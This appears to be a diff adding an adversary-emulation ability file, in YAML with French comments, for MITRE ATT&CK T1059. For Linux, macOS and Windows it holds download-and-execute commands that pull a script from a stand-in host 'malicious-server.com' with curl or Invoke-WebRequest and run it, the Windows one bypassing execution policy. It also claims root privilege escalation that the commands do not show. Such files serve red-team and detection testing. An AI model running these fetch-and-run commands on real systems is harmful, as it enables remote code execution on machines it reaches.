@@ -1,0 +1,65 @@
+id: 12345678-90ab-cdef-1234-567890abcdef
+name: Execution of Malicious Code
+description: Execute malicious code or commands to facilitate privilege escalation on a compromised system.
+tactic: execution
+technique:
+  attack_id: T1059
+  name: Command and Scripting Interpreter
+  reference: https://attack.mitre.org/techniques/T1059/
+platforms:
+  linux:
+    executor:
+      name: sh
+      command: |
+        #!/bin/bash
+        # Télécharge et exécute un script à partir d'un serveur distant
+        curl -s http://malicious-server.com/malicious.sh -o /tmp/malicious.sh
+        chmod +x /tmp/malicious.sh
+        /tmp/malicious.sh
+    cleanup: |
+      # Nettoyage du système en supprimant les fichiers créés
+      rm -f /tmp/malicious.sh
+  windows:
+    executor:
+      name: powershell
+      command: |
+        # Télécharge et exécute un script PowerShell à partir d'un serveur distant
+        Invoke-WebRequest -Uri http://malicious-server.com/malicious.ps1 -OutFile C:\Users\Public\malicious.ps1
+        powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\malicious.ps1
+    cleanup: |
+      # Nettoyage du système en supprimant les fichiers créés
+      Remove-Item -Path C:\Users\Public\malicious.ps1 -Force
+  macos:
+    executor:
+      name: sh
+      command: |
+        # Télécharge et exécute un script à partir d'un serveur distant
+        curl -s http://malicious-server.com/malicious.sh -o /tmp/malicious.sh
+        chmod +x /tmp/malicious.sh
+        /tmp/malicious.sh
+    cleanup: |
+      # Nettoyage du système en supprimant les fichiers créés
+      rm -f /tmp/malicious.sh
+
+# Les conditions de succès de l'attaque
+requirements:
+  - name: curl
+    type: binary
+  - name: powershell
+    type: binary
+
+# Les indicateurs de succès
+privilege:
+  escalation: true
+  user: root
+
+# Métadonnées
+metadata:
+  author: Cybersecurity Analyst
+  creation_date: 2024-12-10
+  mitre_techniques:
+    - T1059
+  tags:
+    - execution
+    - privilege-escalation
+    - malicious-code
